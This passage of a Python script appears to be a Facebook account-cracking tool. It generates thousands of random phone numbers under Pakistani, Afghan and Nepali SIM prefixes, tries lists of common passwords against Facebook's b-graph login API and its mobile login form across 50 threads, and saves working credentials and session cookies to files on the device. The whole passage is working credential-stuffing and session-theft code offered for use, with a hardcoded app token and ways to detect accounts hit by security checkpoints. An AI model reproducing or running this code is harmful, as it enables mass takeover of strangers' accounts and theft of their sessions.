        user.append(nmp)
    with ThreadPool(max_workers=50) as ALINUR:
        tl = str(len(user))
        sex = janu[0]
        linex()
        print('\033[1;95m|—(*) \033[1;92mSIM CODE : '+code) 
        print('\033[1;96m|—(*) \033[1;93mTOTAL CRECK : '+tl)
        print('\033[1;97m|—(*) \033[1;96mAIRPLANE MODE \033[1;91m[\033[1;96mON°\033[1;91mOF\033[1;91m] \033[1;96m')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'pakistan','57273200 57575751','59039200','112244','112200','123412','224455','113322','225566','112255','223355','50607080','77889900','60708090','09876543','00998877','khan123']
            ids = code+love
            if "M1" in janu:
            	ALINUR.submit(api,ids,pwx,tl)
            if "M2" in janu:
            	ALINUR.submit(normal,ids,pwx,tl)
            if "M3" in janu:
            	ALINUR.submit(host,ids,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))
    input('PRESS ENTER TO BACK ')
    main()
###_____AFGHANISTAN____________#####
def Afg():
    user=[]
    os.system('clear')
    print(logo)
    linex()
    print('\033[38;5;44m[=] AFG CODE : 9370, 9378, 9377, 9379, 9374')
    linex()
    code = input(f'\x1b[38;5;155m[=] YOUR CHOICE : ')
    linex()
    print('\033[1;92m|—(*)~[1]\x1b[38;5;84m~ METHOD~[B-GRAPH]')
    print('\033[1;93m|—(*)~[2]\x1b[38;5;208m~ METHOD~[NORMARL]')    
    linex()
    math = input('\033[92;1m[~] CHOICE METHOD : ')
    janu=[]
    if math in ["1"]:
    	janu.append("M1")
    if math in ["2"]:
    	janu.append("M2")    
    linex()
    os.system('clear')
    print(logo)
    print('\033[1;96m[=] EXAMPLE : 3000, 5000, 10000')
    linex()
    limit = int(input('\033[38;5;40m[=] Select Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ALINUR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        sex = janu[0]
        linex()
        print('\033[1;95m|—(*) \033[1;92mSIM CODE : '+code) 
        print('\033[1;96m|—(*) \033[1;93mTOTAL CRECK : '+tl)
        print('\033[1;97m|—(*) \033[1;96mAIRPLANE MODE \033[1;91m[\033[1;96mON°\033[1;91mOF\033[1;91m] \033[1;96m')
        linex()
        for guru in user:
            ids = code+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123','۱۰۰۲۰۰','۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000']
            if "M1" in janu:
            	ALINUR.submit(api,ids,pwx,tl)
            if "M2" in janu:
            	ALINUR.submit(normal,ids,pwx,tl)
            if "M3" in janu:
            	ALINUR.submit(host,ids,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))
    input('PRESS ENTER TO BACK ')
    crack_menu()		

#-------[NEPAL- CLONING]---------#
def Nepal():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    linex()
    print('\033[1;96m|—(*)  NEPAL CODES : +9815 , +9814 , +9861 , +9840 ')
    linex()
    code = input(f'\x1b[38;5;155m[=] YOUR CHOICE : ')
    linex()
    print('\033[1;92m|—(*)~[1]\x1b[38;5;84m~ METHOD~[B-GRAPH]')
    print('\033[1;93m|—(*)~[2]\x1b[38;5;155m~ METHOD~[NORMARL]')
    linex()
    math = input('\033[92;1m[~] CHOICE METHOD : ')
    janu=[]
    if math in ["1"]:
    	janu.append("M1")
    if math in ["2"]:
    	janu.append("M2")
    
    linex()
    print('\033[1;92m|—(*) LIMIT : 5000 , 10000 , 50000 ')
    linex()
    limit = int(input('\x1b[38;5;155m[=] YOUR CHOICE : '))
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as JAN:
        tl = str(len(user))
        sex = janu[0]
        linex()
        print('\033[1;95m|—(*) \033[1;92mSIM CODE : '+code) 
        print('\033[1;96m|—(*) \033[1;93mTOTAL CRECK : '+tl)
        print('\033[1;97m|—(*) \033[1;96mAIRPLANE MODE \033[1;91m[\033[1;96mON°\033[1;91mOF\033[1;91m] \033[1;96m')
        linex()
        for love in user:
            pwx = [love,'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','lama123','lama12345','lama@123','gurung','gurung123','gurung12345','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','tamang12345','456378','281796','124365','672070','624087','532795','275357','374258','57273200']
            ids = code+love
            if "M1" in janu:
            	JAN.submit(api,ids,pwx,tl)
            if "M2" in janu:
            	JAN.submit(normal,ids,pwx,tl)
    linex()
    print('TOTAL OK : \033[1;92m'+str(len(oks)))
    linex()
    input('PRESS ENTER TO BACK ')

#___RANDOM__UPDATE_METHOD__##
def api(ids,pwx,tl):
    global loop,oks,cps,twf
    sys.stdout.write('\r\r\033[1;32m[ALINUR-M1]<>\033[1;36m[%s|%s]<>\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks)));sys.stdout.flush()
    try:
        for pas in pwx:
            adid = str(uuid.uuid4())
            cutta={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            bhootxx={'User-Agent': uaa(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=cutta,headers=bhootxx,allow_redirects=False).json()
            if 'session_key' in po:
                print(f'\r\r \033[1;92m[ALINUR] '+ids+' • '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                print(f'\033[38;5;155m>COOKIES (🔥) : \033[1;93m'+cookies)
                open('/sdcard/M2-OK.txt','a').write(ids+' | '+pas+'\n''COOKIE[??]:'  +cookies+' \n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\033[1;30m[ALINUR-CP] '+ids+' • '+pas+'\033[1;90m')
                open('/sdcard/CP.txt', 'a').write(ids+' | '+pas+' \n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
###_______normal______###
def normal(ids,pwx,tl):
    global loop
    global cps
    global oks
    global twf
    global agents
    try:
        for pas in pwx:
            session = requests.Session()
            sys.stdout.write('\r\r \033[1;32m[ALINUR-M2]<>\033[1;36m[%s|%s]<>\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method': 'POST',
            "path": 'login/device-based/regular/logout/?h=AfeoDyo0DIfk2d3JV_k&t=1702567491',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '2',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/bookmarks/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\r\033[1;92[ALINUR-OK]\33[38;5;49m {uid} • {pas}')
                print(f"\033[1;96mCOOKIE [💮]:\33[1;92m {coki}")
                linex()
                open('/sdcard/RANDOM-OK.txt', 'a').write(uid+' • '+pas+'\n''COOKIE[??]:'  +coki+' \n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = "1000"+coki1[0:11]
                cid = coki[82:97]
                print(f" \033[1;90m[ALINUR-CP] {uid} \033[1;95m×\033[1;90m {pas}")
                open('/sdcard/Random-CP.txt', 'a').write(uid+' • '+pas+' \n')
                cps.append(uid)
                break
         
            else:
                continue
        loop+=1        
    except:
        pass
        
main()